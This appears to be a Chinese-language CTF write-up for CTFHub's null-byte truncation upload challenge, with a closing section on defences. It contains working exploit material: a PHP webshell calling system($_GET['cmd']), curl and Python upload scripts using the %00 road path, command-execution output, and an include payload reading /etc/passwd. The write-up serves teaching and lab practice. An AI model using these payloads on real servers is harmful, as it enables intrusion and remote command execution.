---
layout: post
title: CTFHub - 文件上传 00截断 Writeup
platform: ctfhub
date: 2026-10-23 17:54:00 +0800
categories: CTF
---

CTFHub - 文件上传 00截断 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件上传** → 00 截断）
- 题型：Web
- 考点：**空字节截断（Null Byte Injection）**、路径参数可控


```text
页面标题：CTFHub 文件上传 - 00截断

★ 表单的 action 里带了一个"路径参数"：

    <form action="?road=/var/www/html/upload/" method="post"
          enctype="multipart/form-data">

    ★ ?road= 就是"保存到哪个目录"，攻击者可以改

★ 源码泄露的后端逻辑：

    if (!empty($_POST['submit'])) {
        $name = basename($_FILES['file']['name']);
        $info = pathinfo($name);
        $ext  = $info['extension'];
        $whitelist = array("jpg", "png", "gif");     // ★ 白名单！
        if (in_array($ext, $whitelist)) {
            $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
            if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
                echo "<script>alert('上传成功')</script>";
            } else {
                echo "<script>alert('上传失败')</script>";
            }
        } else {
            echo "文件类型不匹配";
        }
    }

★ 分析：

    ① 后缀是【白名单】jpg/png/gif → 传 shell.php 直接被拦
    ② 文件名是【随机生成】的：rand(10,99) + 时间戳 + .jpg
       → 就算传上去，你也猜不到文件名
    ③ 但 $des 的【目录部分】来自 $_GET['road'] → 可控！

★ 攻击思路：在 road 里塞 %00（空字节），截断后面的随机名 + 后缀

    road = /var/www/html/upload/shell.php%00

    $des = "/var/www/html/upload/shell.php" + "\0" + "/78" + "20261023175446" + ".jpg"
                                              └─┬─┘
                                    PHP 的文件函数遇到 \0 就截断

    → 实际保存为：/var/www/html/upload/shell.php

★ 实测：

    POST /?road=/var/www/html/upload/shell.php%00
    file=shell.jpg  (内容是 PHP 代码)
    Content-Type: image/jpeg

    → 提示"上传成功"

    GET /upload/shell.php?cmd=id
    → uid=33(www-data) gid=33(www-data) groups=33(www-data)     ✅ RCE

★ 找 flag：

    ?cmd=ls -la /var/www/html
    → flag_922329094.php

    ?cmd=cat /var/www/html/flag_922329094.php
    → <?php // ctfhub{9f29e510d6e67db82a79daf9}

flag         : ctfhub{9f29e510d6e67db82a79daf9}
```

二、题目分析

**① 什么是"空字节截断"**

```text
空字节 = \0 = NULL = 0x00

C 语言的字符串是"以 \0 结尾"的字符数组：

    "/var/www/html/upload/shell.php\0/78 20261023.jpg"
    └────────────────────────────┬───────────────────┘
                         C 函数看到这里就认为字符串结束了

所以 PHP 调用底层的 C 函数（open/move_uploaded_file 等）时：
    传进去的是完整字符串（PHP 内部长度是 27 + 一堆）
    但 C 函数读到 \0 就停止
    → 实际操作的路径只有前面那段
```

**这就是"截断"** —— 你以为传的是长路径，实际只用了前面一截。

**② 本题的代码为什么会中招**

```php
$des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
//     └────┬────┘   └──────────────────────┬──────────────────────┘
//     可控            不可控（随机名+时间戳+安全后缀）

// 正常情况：
//   $des = "/var/www/html/upload/78920261023175446.jpg"
//   → 传上去是一个随机名字的 jpg，不能执行，你也猜不到名字

// 攻击情况（road 带 %00）：
//   $des = "/var/www/html/upload/shell.php\0/78920261023175446.jpg"
//   move_uploaded_file() 在 C 层截断 → 实际保存 /var/www/html/upload/shell.php
//   → 文件名可控，后缀是 .php，能执行
```

**③ 白名单 + 随机名，为什么还是被绕过**

```text
开发者的思路：
    ① 后缀白名单（jpg/png/gif）→ 阻止传 .php
    ② 文件名随机 → 就算传上去，攻击者也不知道叫什么

漏点：
    ③ 保存【路径】的目录部分来自 URL 参数，没做过滤
    → 用空字节把"随机名+后缀"全部截掉
    → 文件名由攻击者自己指定
```

**★ 这是典型的"只防了一个维度"**：

```
防住了"后缀"（白名单）
防住了"文件名"（随机）
漏了"路径"（$_GET['road'] 可控）
```

**④ 为什么现在很少见了**

```text
PHP 5.3.4（2010-12）之后，PHP 内核禁止在文件路径里出现空字节：
    调用 move_uploaded_file()、fopen()、include() 等函数时
    如果路径里有 \0 → 直接报错并返回 false

所以：
    · CTF 里的靶场故意用老版本 PHP（或模拟截断）
    · 真实环境里 PHP 5.3.4+ 已经免疫
    · 但其他语言/老系统仍可能有（Java、老版本 Python、C 程序）
```

**★ 这题考的是"历史漏洞"，理解原理比记住 payload 重要。**

三、解题步骤

**第 1 步：看源码，找到可控点**

```
看表单：
    <form action="?road=/var/www/html/upload/" ...>

★ action 里带 ?road= → 说明"保存路径"由这个参数决定
★ 而且它还能被我们改（直接在 URL 里改）
```

**第 2 步：确认白名单**

```
从源码看：
    $whitelist = array("jpg", "png", "gif");
    
→ 传 .php 会被拦，文件必须叫 xxx.jpg / xxx.png / xxx.gif
```

**第 3 步：构造 00 截断**

```
目标：让最终保存的路径是 /var/www/html/upload/shell.php

原代码：
    $des = $_GET['road'] . "/" . 随机名 . 时间戳 . "." . $ext;

设置 road：
    /var/www/html/upload/shell.php%00

拼出来：
    /var/www/html/upload/shell.php\0/78 20261023175446.jpg
                                  ↑
                            从这里被截断

实际保存：
    /var/www/html/upload/shell.php
```

**第 4 步：发请求**

**用 Burp**：

```
① Burp 抓上传请求
② 把 URL 改成：
   POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1
   
   ⚠️ 注意：Burp 里 %00 要【保持编码形式】写，不要写真的空字节
   （有些 Burp 版本可以在 Hex 视图里插 00，但用 %00 更简单）

③ filename 保持 shell.jpg（要过白名单）
④ 内容改成 PHP 代码
⑤ Forward
```

**用 curl**：

```bash
curl -X POST "http://challenge-xxx:10800/?road=/var/www/html/upload/shell.php%00" \
     -F "submit=Submit" \
     -F "file=@shell.jpg;type=image/jpeg"
```

**★ `%00` 在 URL 里会被 PHP 的 `$_GET` 解码成真正的空字节。**

**用 Python**：

```python
url = BASE + "/?road=/var/www/html/upload/shell.php%00"   # 保持 %00
# 其余同普通上传
```

**第 5 步：验证**

```
GET /upload/shell.php?cmd=id
→ uid=33(www-data)...
```

**★ 如果 404**，说明截断没生效（PHP 版本太新），可以试：

```
· road 里用真的 \x00 字节（Burp 的 Hex 视图）
· 或者试试 .php 以外的后缀
· 或者这题需要另一个思路（比如 ../ 路径穿越）
```

**第 6 步：找 flag**

```
?cmd=ls -la /var/www/html
→ flag_922329094.php

?cmd=cat /var/www/html/flag_922329094.php
→ <?php // ctfhub{...}
```

---

**完整脚本**

```python
import uuid, urllib.request, urllib.parse

BASE = "http://challenge-xxx:10800"
OPEN = "<" + "?" + "php "
CLOSE = "?" + ">"


def upload(filename, content, road):
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
    body = (("--%s\r\n" % boundary).encode()
            + b'Content-Disposition: form-data; name="submit"\r\n\r\nSubmit\r\n'
            + ("--%s\r\n" % boundary).encode()
            + ('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % filename).encode()
            + b"Content-Type: image/jpeg\r\n\r\n"
            + content.encode() + b"\r\n"
            + ("--%s--\r\n" % boundary).encode())
    url = BASE + "/?road=" + road          # ★ road 里已含 %00，不能再编码
    req = urllib.request.Request(url, data=body, method="POST",
            headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
    return urllib.request.urlopen(req).read().decode()


# 文件名必须是 jpg（白名单），路径用 00 截断
print(upload("shell.jpg", OPEN + "system($_GET['cmd']); " + CLOSE,
             "/var/www/html/upload/shell.php%00"))

# 执行
u = BASE + "/upload/shell.php?cmd=" + urllib.parse.quote("ls -la /var/www/html")
print(urllib.request.urlopen(u).read().decode())
```

---

**手工操作（浏览器 + 改地址栏，最简单）**

```
① 打开题目页面
② 看表单，action 是 "?road=/var/www/html/upload/"
③ 直接把地址栏改成：
   http://challenge-xxx:10800/?road=/var/www/html/upload/shell.php%00
   
   ★ 注意：浏览器地址栏里打 %00 会保持编码形式
   
④ 在这个页面上传 shell.jpg（内容是 PHP 代码）
⑤ 看到"上传成功"
⑥ 访问 /upload/shell.php?cmd=id
```

**★ 这是本系列里最容易手工做的一题** —— 只要改地址栏。

四、延伸知识

**① 空字节截断的几种经典场景**

**（1）路径截断（本题）**

```php
$des = $_GET['road'] . "/" . $random . "." . $ext;
// road = /var/www/html/upload/shell.php%00
```

**（2）文件名截断**

```php
$name = $_POST['name'] . ".jpg";
// 输入 name = "shell.php%00"
// → shell.php\0.jpg → 截断成 shell.php
```

**（3）文件包含截断**

```php
include($_GET['page'] . ".php");
// ?page=../../etc/passwd%00
// → include("../../etc/passwd\0.php") → 实际 include 了 /etc/passwd
```

**（4）数据库截断（老版本）**

```sql
INSERT INTO users (name) VALUES ('admin\0...')
-- MySQL 里 varchar 字段可能被截断成 "admin"
```

**② 00 截断的其他写法**

```text
① %00（URL 编码）      —— 最常用
② \x00（十六进制）      —— Burp 的 Hex 视图里插入
③ \0（字符字面量）      —— 某些语言里
④ %2500（双重编码）     —— 服务端解码两次时用
```

**Burp 里怎么插真空字节**：

```
① 选中要插入的位置
② 右键 → Convert selection → URL → URL-encode key characters
③ 或者用 Hex 视图：右键 → Show as → Hex，手动改 00
```

**③ 为什么现代 PHP 免疫了**

```text
PHP 5.3.4 的 changelog：
    "Fixed bug #39863 (Null byte in include paths)"
    → 文件系统函数遇到 \0 会报错：
       Warning: move_uploaded_file() expects parameter 2 to be a valid path

所以真实环境里 00 截断基本绝迹
但 CTF 靶场用老版本 PHP 或模拟逻辑，所以还能打
```

**④ 这题的另一个可能思路（如果 00 不生效）**

```
如果有路径穿越 + 白名单：
    road = /var/www/html/upload/../../shell    （覆盖别的文件）
    
或者配合 .htaccess：
    road = /var/www/html/upload/       （正常）
    再单独传 .htaccess（但白名单不允许 .htaccess）

或者利用随机名的可预测性：
    rand(10,99) 只有 90 种可能
    date("YmdHis") 精确到秒
    → 爆破 90 × 几秒 = 几百个请求就能找到文件
    ★ 这是"随机名不够随机"的经典问题
```

**⑤ 防护**

```text
① ★ 不要用用户输入拼路径
    $des = UPLOAD_DIR . '/' . $new_name;   // 固定目录

② ★ 用 basename() 处理文件名，用 realpath() 验证最终路径
    $real = realpath($des);
    if (strpos($real, UPLOAD_DIR) !== 0) die("路径非法");

③ ★ 上传后重命名（随机名 + 白名单后缀）

④ ★ 上传目录禁止执行

⑤ 用新版本 PHP（5.3.4+ 天然免疫 00 截断）

⑥ 校验文件名不包含 \0、/、\、.. 等
```

五、总结

- **本题核心：保存路径的目录部分来自 `?road=` 参数 → 用 `%00` 截断后面的随机名 → 文件名可控。**
- 一个 payload：

```
POST /?road=/var/www/html/upload/shell.php%00
file=shell.jpg  （内容是 PHP 代码，要过 jpg 白名单）
→ 实际保存为 /var/www/html/upload/shell.php
```

- **三个必记要点**：

```text
① 白名单 + 随机名都防不住"路径可控"
② %00 在 PHP 的 $_GET 里会被解码成真空字节，
   而底层 C 函数把它当字符串结束符 → 截断
③ PHP 5.3.4+ 已免疫，所以这是"历史漏洞"题
```

- **实测 flag**：

```text
ctfhub{9f29e510d6e67db82a79daf9}
（在 /var/www/html/flag_922329094.php 里）
```


**手工复现要点**：

```text
· 第一步看表单 action，找"可控参数"（本题是 ?road=）
· 确认后缀白名单（从源码注释里看）
· 地址栏改成 ?road=/var/www/html/upload/shell.php%00
· 在上面传 shell.jpg（PHP 内容）
· 访问 /upload/shell.php?cmd=id
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  空字节 \0 是 C 字符串的"结束符"                          │
│  程序以为处理了完整路径，实际只用了 \0 前面那段             │
│                                                        │
│  凡是"用户输入 + 拼接路径/文件名"的地方，               │
│  都要考虑 00 截断（老系统）和路径穿越（../）              │
└────────────────────────────────────────────────────────┘
```
